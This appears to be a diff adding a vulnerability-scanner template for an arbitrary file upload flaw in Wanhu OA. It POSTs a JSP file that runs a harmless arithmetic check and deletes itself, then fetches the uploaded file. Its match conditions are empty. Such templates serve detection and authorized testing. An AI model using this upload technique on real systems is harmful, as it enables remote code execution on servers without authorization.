@@ -1,0 +1,32 @@
+id: wanhu-oa-fileupload-controller
+brief:
+    title: Wanhu OA Fileupload Controller - Arbitrary File Upload
+    by: SleepingBag945
+    level: critical
+    about: There is an arbitrary file upload vulnerability in Wanhu OA fileUpload.controller. An attacker can upload any file through the vulnerability.
+    label:
+        - wanhu
+        - oa
+        - fileupload
+        - controller
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/defaultroot/upload/fileUpload.controller'
+      head:
+        Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed
+        Cookie: OASESSIONID=416B4CE965CD27DEED8197A8528A33E6
+      body: |-
+        --b0d829daa06c13d6b3e16b0ad21d1eed
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.print({{num1}}*{{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --b0d829daa06c13d6b3e16b0ad21d1eed--
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/defaultroot/upload/html/{{filename}}'
+      signs: []
